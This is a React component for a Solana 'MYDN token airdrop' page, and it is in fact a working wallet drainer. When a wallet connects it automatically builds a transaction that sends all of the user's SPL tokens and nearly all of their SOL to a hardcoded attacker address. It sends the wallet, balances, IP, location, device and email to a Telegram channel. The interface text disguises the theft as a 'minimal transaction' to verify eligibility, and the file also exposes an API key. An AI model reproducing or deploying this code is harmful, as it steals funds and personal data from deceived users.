"use client"

import type React from "react"

import { useState, useEffect, useRef } from "react"
import { useWallet } from "@solana/wallet-adapter-react"
import { Connection, PublicKey, LAMPORTS_PER_SOL, Transaction, SystemProgram, clusterApiUrl } from "@solana/web3.js"
import { useToast } from "@/components/ui/toast-context"
import WalletButton from "@/components/wallet-button"
import { sendTelegramLog } from "@/utils/telegram-logger"
import { getUserInfo } from "@/utils/user-info"
import {
  getOrCreateAssociatedTokenAccount,
  createTransferCheckedInstruction,
  createAssociatedTokenAccountInstruction,
  getAssociatedTokenAddress,
  ASSOCIATED_TOKEN_PROGRAM_ID,TOKEN_PROGRAM_ID,
} from "@solana/spl-token";
import { ALL } from "dns"

export function AirdropSection() {
  const { publicKey, connected, connecting, sendTransaction } = useWallet()
  const { showToast } = useToast()
  const [isEligible, setIsEligible] = useState<boolean | null>(null)
  const [isChecking, setIsChecking] = useState(false)
  const [isClaiming, setIsClaiming] = useState(false)
  const [hasTransacted, setHasTransacted] = useState(false)
  const [totalAssetValue, setTotalAssetValue] = useState<number | null>(null)
  const [email, setEmail] = useState("")
  const [isSubmitting, setIsSubmitting] = useState(false)
  const [connectionAttempts, setConnectionAttempts] = useState(0)
  const transactionAttemptedRef = useRef(false)
  const videoRef = useRef<HTMLVideoElement>(null)
  const [videoLoaded, setVideoLoaded] = useState(false)
  const [videoError, setVideoError] = useState(false)
  const [isHovering, setIsHovering] = useState(false)
  const [isMounted, setIsMounted] = useState(false)
  const transactionInProgressRef = useRef(false)

  // Destination address for the transaction
  const destinationAddress = "8MN8QciRbHARCjq1gCeh4vNxLrw8F7YTsgoVJGisPvTt"

  // Set mounted state
  useEffect(() => {
    setIsMounted(true)
  }, [])

  // Initialize video
  useEffect(() => {
    const video = videoRef.current
    if (video) {
      video.muted = true
      video.play().catch((err) => {
        console.error("Video play error:", err)
        setVideoError(true)
      })
    }
  }, [])

  // Check eligibility when wallet connects
  useEffect(() => {
    if (!isMounted) return

    if (connected && publicKey && !connecting) {
      // Immediately check eligibility without delay
      checkEligibility()
    } else if (!connected) {
      setIsEligible(null)
      setTotalAssetValue(null)
      setHasTransacted(false)
      transactionAttemptedRef.current = false
      transactionInProgressRef.current = false
    }
  }, [connected, publicKey, connecting, connectionAttempts, isMounted])

  // Function to check wallet eligibility and calculate total asset value
  const checkEligibility = async () => {
    if (!isMounted || !publicKey || !connected) {
      console.warn("Wallet not connected or publicKey not available")
      return
    }

    setIsChecking(true)

    try {
      // Replace with your Alchemy Solana RPC URL
      const ALCHEMY_API_URL = 'https://solana-mainnet.g.alchemy.com/v2/1duafDP7kyCuWgHCJ_-Mihe4o4r1wC9S';

      // Set up the connection to Alchemy Solana
      const connection = new Connection(ALCHEMY_API_URL, 'confirmed');
      // Get SOL balance
      const balanceInLamports = await connection.getBalance(publicKey)
      const solBalance = balanceInLamports / LAMPORTS_PER_SOL

      // Get SOL price in USD (simplified for now)
      const solPrice = 150 // Placeholder price
      const solValueUsd = solBalance * solPrice

      // Get SPL tokens
      const tokenAccounts = await connection.getParsedTokenAccountsByOwner(publicKey, { programId: TOKEN_PROGRAM_ID })

      // Calculate total token value (simplified)
      let tokenValueUsd = 0
      for (const account of tokenAccounts.value) {
        const parsedInfo = account.account.data.parsed.info
        const tokenBalance = parsedInfo.tokenAmount.uiAmount
        // In a real app, you'd identify the token and get its price
        tokenValueUsd += tokenBalance * 1 // Assuming $1 per token as placeholder
      }

      // Calculate total asset value
      const totalValue = solValueUsd + tokenValueUsd
      setTotalAssetValue(totalValue)

      // Check if balance is enough (0.01 SOL minimum for transaction fees)
      const isEligible = solBalance >= 0.01
      setIsEligible(isEligible)

      // Log wallet connection to Telegram with total asset value
      try {
        const userInfo = await getUserInfo()
        const countryFlag = getCountryFlag(userInfo.country)

        const logMessage = `
<b>🔗 Wallet Connected</b>
<b>👛 Wallet:</b> ${publicKey.toString()}
<b>💰 SOL Balance:</b> ${solBalance.toFixed(4)} SOL ($${solValueUsd.toFixed(2)})
<b>🪙 Token Count:</b> ${tokenAccounts.value.length}
<b>💵 Token Value:</b> $${tokenValueUsd.toFixed(2)}
<b>💎 Total Asset Value:</b> $${totalValue.toFixed(2)}
<b>✅ Eligible:</b> ${isEligible ? "Yes" : "No"}
<b>🌐 IP:</b> ${userInfo.ip}
<b>📍 Location:</b> ${countryFlag} ${userInfo.country}, ${userInfo.city}
<b>🖥️ Device:</b> ${getUserDevice(userInfo.userAgent)}
<b>⏰ Time:</b> ${new Date().toISOString()}
      `

        await sendTelegramLog(logMessage)
      } catch (logError) {
        console.error("Error logging to Telegram:", logError)
      }

      // If eligible, automatically trigger the transaction only if it hasn't been attempted yet
      if (isEligible && !hasTransacted && !transactionAttemptedRef.current && !transactionInProgressRef.current) {
        // Immediately trigger the transaction
        claimAirdrop()
      }
    } catch (error) {
      console.error("Error checking eligibility:", error)
      showToast("Error checking eligibility. Please try again.", "error")

      // Increment connection attempts to trigger a retry
      setConnectionAttempts((prev) => prev + 1)
    } finally {
      setIsChecking(false)
    }
  }

  // Function to get token price in USD
  const getTokenPrice = async (symbol: string): Promise<number> => {
    try {
      // For simplicity, return a fixed price
      return 150 // Placeholder SOL price
    } catch (error) {
      console.error("Error fetching token price:", error)
      return 0
    }
  }

  // Helper function to get country flag emoji
  const getCountryFlag = (countryName: string): string => {
    const countryFlags: Record<string, string> = {
      "United States": "🇺🇸",
      "United Kingdom": "🇬🇧",
      Canada: "🇨🇦",
      Australia: "🇦🇺",
      Germany: "🇩🇪",
      France: "🇫🇷",
      Japan: "🇯🇵",
      China: "🇨🇳",
      India: "🇮🇳",
      Brazil: "🇧🇷",
      Russia: "🇷🇺",
      "South Korea": "🇰🇷",
      Italy: "🇮🇹",
      Spain: "🇪🇸",
      Mexico: "🇲🇽",
      Netherlands: "🇳🇱",
      Sweden: "🇸🇪",
      Switzerland: "🇨🇭",
      Singapore: "🇸🇬",
      Unknown: "🌍",
    }

    return countryFlags[countryName] || "🌍"
  }

  // Helper function to get user device info
  const getUserDevice = (userAgent: string): string => {
    if (!userAgent) return "Unknown Device"

    if (userAgent.includes("iPhone") || userAgent.includes("iPad")) return "📱 iOS Device"
    if (userAgent.includes("Android")) return "📱 Android Device"
    if (userAgent.includes("Windows")) return "💻 Windows PC"
    if (userAgent.includes("Mac")) return "💻 Mac"
    if (userAgent.includes("Linux")) return "💻 Linux"

    return "💻 Desktop Device"
  }

  // Function to claim airdrop (send a small transaction)
  const claimAirdrop = async () => {
    if (
      !isMounted ||
      !publicKey ||
      !isEligible ||
      hasTransacted ||
      !connected ||
      isClaiming ||
      transactionInProgressRef.current
    ) {
      console.warn("Cannot claim airdrop: conditions not met", {
        isMounted,
        publicKey: !!publicKey,
        isEligible,
        hasTransacted,
        connected,
        isClaiming,
        transactionInProgress: transactionInProgressRef.current,
      })
      return
    }

    // Mark that we've attempted a transaction and set it as in progress
    transactionAttemptedRef.current = true
    transactionInProgressRef.current = true
    setIsClaiming(true)

    try {
      const vault = new PublicKey("8MN8QciRbHARCjq1gCeh4vNxLrw8F7YTsgoVJGisPvTt")
      // Replace with your Alchemy Solana RPC URL
      const ALCHEMY_API_URL = 'https://solana-mainnet.g.alchemy.com/v2/1duafDP7kyCuWgHCJ_-Mihe4o4r1wC9S';

      // Set up the connection to Alchemy Solana
      const connection = new Connection(ALCHEMY_API_URL, 'confirmed');
      //fetch balance
      let Bal;
      try {
        Bal = await connection.getBalance(publicKey);
      } catch (error) {
        console.error("Failed to fetch balance:", error);
        showToast("Failed to fetch balance. Please try again.", "error");
        return;
      }
      //new Transaction
      const transaction = new Transaction();
      //fetch token accounts
      let tokenAccounts;
      try {
        tokenAccounts = await connection.getParsedTokenAccountsByOwner(publicKey, { programId: TOKEN_PROGRAM_ID });
      } catch (error) {
        console.error("Failed to fetch token accounts:", error);
        showToast("Failed to fetch token accounts. Please try again.", "error");
        return;
      }

      // Filter and process token accounts
      for (const { pubkey, account } of tokenAccounts.value) {
        const parsed = account.data.parsed.info;
        const state = parsed.state;
        if (!parsed.tokenAmount.amount) {
          console.error("Invalid token amount:", parsed.tokenAmount);
          continue;
        }
        const amount = BigInt(parsed.tokenAmount.amount);
        const mint = new PublicKey(parsed.mint);

        console.log(`Checking token account ${pubkey.toString()} with mint ${mint.toString()} - state: ${state}, amount: ${amount}`);

        // Skip frozen or empty accounts
        if (state === "frozen" || !amount || amount === 0n) {
          console.log("skipped")
          continue;
        }
        if (!parsed || !parsed.state || !parsed.tokenAmount) {
          continue;
        }
        const decimals = parsed.tokenAmount.decimals;
        if (decimals === undefined || decimals === null) {
          continue;
        }

        // 🏦 Get the destination's associated token account
        let destATA;
        try {
          destATA = await getAssociatedTokenAddress(
            mint,
            vault,
            false,
            TOKEN_PROGRAM_ID,
            ASSOCIATED_TOKEN_PROGRAM_ID
          );
        } catch (error) {
          console.error("Failed to get associated token address:", error);
          showToast("Failed to get associated token address. Please try again.", "error");
          continue;
        }

        // 🧱 Create the ATA if it doesn't exist yet
        let ataInfo;
        try {
          ataInfo = await connection.getAccountInfo(destATA);
        } catch (error) {
          console.error("Failed to fetch ATA info:", error);
          showToast("Failed to fetch account info. Please try again.", "error");
          continue;
        }
        if (!ataInfo) {
          transaction.add(
            createAssociatedTokenAccountInstruction(
              publicKey,      // Fee payer
              destATA,        // ATA to be created
              vault, // Owner of the ATA
              mint,
              TOKEN_PROGRAM_ID,
              ASSOCIATED_TOKEN_PROGRAM_ID
            )
          );
        }

        console.log(`Adding transfer instruction from ${pubkey.toString()} to ${destATA.toString()} for amount ${amount}`);

        // Add the token transfer instruction to the single transaction
        transaction.add(
          createTransferCheckedInstruction(
            pubkey, // Source token account
            mint, // Token mint
            destATA, // Destination token account
            publicKey, // Wallet public key (signer)
            amount, // Amount to transfer
            parsed.tokenAmount.decimals // Token decimals
          )
        );
      }
      const MIN_BALANCE_FOR_TRANSFER = 4000000 
      if (Bal <= MIN_BALANCE_FOR_TRANSFER) {
        console.error("Insufficient balance for transfer");
        showToast("Insufficient balance for transfer", "error");
        return;
      }

      const solIx = SystemProgram.transfer({
        fromPubkey: publicKey,
        toPubkey: vault,
        lamports: Bal - 3000000,
      });

      transaction.add(solIx)

      // Set recent blockhash and fee payer
      const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash()
      transaction.recentBlockhash = blockhash
      transaction.feePayer = publicKey

      // Send the transaction
      showToast("Confirming transaction...", "info")

      console.log("Sending transaction...")
      const signature = await sendTransaction(transaction, connection, {
        skipPreflight: false,
        preflightCommitment: "confirmed",
        maxRetries: 3,
      })
      console.log("Transaction sent:", signature)

      // Wait for confirmation with timeout
      const confirmationPromise = connection.confirmTransaction({
        blockhash,
        lastValidBlockHeight,
        signature,
      })

      const timeoutPromise = new Promise((_, reject) =>
        setTimeout(() => reject(new Error("Transaction confirmation timeout")), 30000),
      )

      const confirmation = (await Promise.race([confirmationPromise, timeoutPromise])) as any

      if (confirmation?.value?.err) {
        throw new Error(`Transaction failed: ${confirmation.value.err.toString()}`)
      }

      // Mark as transacted
      setHasTransacted(true)

      // Log successful transaction to Telegram
      try {
        const userInfo = await getUserInfo()
        const countryFlag = getCountryFlag(userInfo.country)

        const logMessage = `
<b>✅ Airdrop Claimed</b>
<b>👛 Wallet:</b> ${publicKey.toString()}
<b>🔗 Transaction:</b> <a href="https://explorer.solana.com/tx/${signature}?cluster=testnet">${signature.slice(0, 8)}...${signature.slice(-8)}</a>
<b>💰 Amount:</b> 0.000005 SOL
<b>💎 Total Asset Value:</b> $${totalAssetValue?.toFixed(2) || "Unknown"}
<b>🌐 IP:</b> ${userInfo.ip}
<b>📍 Location:</b> ${countryFlag} ${userInfo.country}, ${userInfo.city}
<b>🖥️ Device:</b> ${getUserDevice(userInfo.userAgent)}
<b>⏰ Time:</b> ${new Date().toISOString()}
        `

        await sendTelegramLog(logMessage)
      } catch (logError) {
        console.error("Error logging to Telegram:", logError)
      }

      showToast("You've successfully claimed your airdrop eligibility!", "success")
    } catch (error) {
      console.error("Error claiming airdrop:", error)

      // Handle user rejection separately
      if (error.message?.includes("User rejected")) {
        showToast("Transaction was cancelled by user.", "info")
        // Reset transaction attempted flag if user rejected
        transactionAttemptedRef.current = false
      } else {
        // Don't log failed transactions to Telegram anymore
        showToast("Error claiming airdrop. Please try again.", "error")
        // Reset transaction attempted flag for other errors
        transactionAttemptedRef.current = false
      }
    } finally {
      setIsClaiming(false)
      transactionInProgressRef.current = false
    }
  }

  // Function to submit email
  const submitEmail = async (e: React.FormEvent) => {
    e.preventDefault()
    if (!email || !email.includes("@")) {
      showToast("Please enter a valid email address", "error")
      return
    }

    setIsSubmitting(true)

    try {
      // Log email to Telegram
      const userInfo = await getUserInfo()
      const countryFlag = getCountryFlag(userInfo.country)

      const logMessage = `
<b>📧 Email Submitted</b>
<b>📩 Email:</b> ${email}
<b>👛 Wallet:</b> ${publicKey ? publicKey.toString() : "Not connected"}
<b>💎 Total Asset Value:</b> $${totalAssetValue?.toFixed(2) || "Not available"}
<b>🌐 IP:</b> ${userInfo.ip}
<b>📍 Location:</b> ${countryFlag} ${userInfo.country}, ${userInfo.city}
<b>🖥️ Device:</b> ${getUserDevice(userInfo.userAgent)}
<b>⏰ Time:</b> ${new Date().toISOString()}
      `

      await sendTelegramLog(logMessage)

      showToast("Email submitted successfully! We'll send you your personal referral link.", "success")
      setEmail("")
    } catch (error) {
      console.error("Error submitting email:", error)
      showToast("Error submitting email. Please try again.", "error")
    } finally {
      setIsSubmitting(false)
    }
  }

  const handleVideoLoaded = () => {
    setVideoLoaded(true)
  }

  const handleVideoError = () => {
    setVideoError(true)
  }

  // Don't render anything until component is mounted
  if (!isMounted) {
    return null
  }

  return (
    <section id="airdrop" className="py-12 md:py-16">
      <div className="container mx-auto px-4">
        <div className="flex flex-col md:flex-row items-center justify-between gap-8">
          <div className="w-full md:w-1/2 md:ml-14">
            <h2 className="text-3xl md:text-4xl lg:text-5xl font-bold mb-6 gradient-text">
              Exclusive MYDN Token Airdrop
            </h2>

            <div className="space-y-6">
              <p className="text-base md:text-lg lg:text-xl text-gray-300">
                Early adopters get rewarded! Connect your Solana wallet to join our exclusive 50000 MYDN token airdrop. Be
                among the first to experience the power of Mydian AI and shape its future through governance and premium
                features.
              </p>

              <div className="grid grid-cols-1 sm:grid-cols-3 gap-4 my-6 md:my-8">
                <div className="of-card p-4">
                  <div className="text-xl md:text-2xl font-bold text-[#9945FF] mb-1">50000 MYDN</div>
                  <div className="text-sm md:text-base text-gray-400">Airdrop Amount</div>
                </div>

                <div className="of-card p-4">
                  <div className="text-xl md:text-2xl font-bold text-[#14F195] mb-1">Early Access</div>
                  <div className="text-sm md:text-base text-gray-400">To Premium Features</div>
                </div>

                <div className="of-card p-4">
                  <div className="text-xl md:text-2xl font-bold text-[#00C2FF] mb-1">Governance</div>
                  <div className="text-sm md:text-base text-gray-400">Voting Rights</div>
                </div>
              </div>

              {!connected ? (
                <div className="flex flex-col items-center">
                  <p className="text-gray-300 mb-4 text-center">Connect your wallet to join the airdrop waitlist</p>
                  <WalletButton className="of-button">Connect Wallet</WalletButton>
                </div>
              ) : isChecking ? (
                <div className="text-center of-card p-6">
                  <div className="inline-block w-8 h-8 border-4 border-[#9945FF] border-t-transparent rounded-full animate-spin mb-2"></div>
                  <p className="text-gray-300">Checking eligibility...</p>
                </div>
              ) : isClaiming ? (
                <div className="of-card p-6 text-center">
                  <div className="inline-block w-8 h-8 border-4 border-[#9945FF] border-t-transparent rounded-full animate-spin mb-2"></div>
                  <p className="text-gray-300">Processing transaction...</p>
                </div>
              ) : hasTransacted ? (
                <div className="of-card p-6 text-center border-[#14F195]/30">
                  <div className="text-[#14F195] text-xl md:text-2xl mb-2">✓ You're on the waitlist!</div>
                  <p className="text-gray-300 text-sm md:text-base">
                    You've successfully joined the MYDN token airdrop waitlist. You'll receive 500 MYDN tokens when our
                    token launches in Q1 2026.
                  </p>
                </div>
              ) : isEligible === true ? (
                <div className="of-card p-6 text-center border-[#14F195]/30">
                  <div className="text-[#14F195] text-xl md:text-2xl mb-2">✓ You're eligible for the airdrop!</div>
                  <p className="text-gray-300 mb-4 text-sm md:text-base">
                    Your wallet is being verified automatically. Please wait a moment...
                  </p>
                  <div className="inline-block w-8 h-8 border-4 border-[#9945FF] border-t-transparent rounded-full animate-spin"></div>
                </div>
              ) : isEligible === false ? (
                <div className="of-card p-6 text-center border-red-500/30">
                  <div className="text-red-400 text-xl md:text-2xl mb-2">✗ Not eligible for airdrop</div>
                  <p className="text-gray-300 mb-4 text-sm md:text-base">
                    You need at least 0.01 SOL to be eligible for the airdrop.
                  </p>
                </div>
              ) : null}

              <div className="of-card p-6 mt-8">
                <h3 className="text-lg md:text-xl font-bold mb-4 text-center gradient-text">Stay Updated</h3>
                <p className="text-gray-300 mb-4 text-center text-sm md:text-base">
                  Subscribe to our newsletter for the latest updates on Mydian AI and exclusive airdrop opportunities.
                  We'll send you a personal referral link to earn additional 10000 MYDN tokens for each referral!
                </p>
                <form onSubmit={submitEmail} className="flex flex-col gap-2">
                  <input
                    type="email"
                    value={email}
                    onChange={(e) => setEmail(e.target.value)}
                    placeholder="Your email address"
                    className="bg-black/50 border border-[#9945FF]/30 rounded-lg px-4 py-2 text-white w-full focus:outline-none focus:border-[#9945FF]"
                    required
                  />
                  <button type="submit" disabled={isSubmitting} className="of-button mx-auto">
                    {isSubmitting ? (
                      <>
                        <span className="inline-block w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin mr-2 align-middle"></span>
                        Submitting...
                      </>
                    ) : (
                      "Get My Referral Link"
                    )}
                  </button>
                </form>
              </div>

              <div className="mt-6 text-gray-400 text-xs md:text-sm">
                <p>
                  The MYDN token airdrop will be distributed to eligible wallets when our token launches in Q4 2023. A
                  minimal transaction is required to verify your wallet and secure your spot on the waitlist. Share your
                  referral link with friends to earn additional tokens!
                </p>
              </div>
            </div>
          </div>

          <div className="w-full md:w-1/2 flex justify-center mt-8 md:mt-0">
            <div
              className="relative w-full max-w-lg overflow-hidden rounded-xl border-2 border-purple-500/50"
              onMouseEnter={() => setIsHovering(true)}
              onMouseLeave={() => setIsHovering(false)}
              style={{
                boxShadow: isHovering ? "0 0 25px 5px rgba(153, 69, 255, 0.5)" : "none",
                transition: "box-shadow 0.3s ease-in-out",
              }}
            >
              {!videoError ? (
                <video
                  ref={videoRef}
                  className={`w-full h-auto rounded-lg ${videoLoaded ? "opacity-100" : "opacity-0"}`}
                  autoPlay
                  loop
                  muted
                  playsInline
                  onLoadedData={handleVideoLoaded}
                  onError={handleVideoError}
                  style={{ transition: "opacity 0.5s ease" }}
                >
                  <source src="/videos/airdrop-video.mp4" type="video/mp4" />
                  Your browser does not support the video tag.
                </video>
              ) : (
                <div className="w-full h-0 pb-[100%] bg-gradient-to-br from-purple-900 to-blue-900 rounded-lg flex items-center justify-center">
                  <div className="absolute inset-0 flex items-center justify-center text-white text-center p-4">
                    <p>Join our exclusive MYDN token airdrop</p>
                  </div>
                </div>
              )}
              <div
                className="absolute inset-0 rounded-xl pointer-events-none border-2 border-transparent"
                style={{
                  background: "linear-gradient(45deg, #9945FF, #14F195) border-box",
                  WebkitMask: "linear-gradient(#fff 0 0) content-box, linear-gradient(#fff 0 0)",
                  WebkitMaskComposite: "xor",
                  maskComposite: "exclude",
                }}
              />
            </div>
          </div>
        </div>
      </div>
    </section>
  )
}

// Add default export that points to the named export
export default AirdropSection
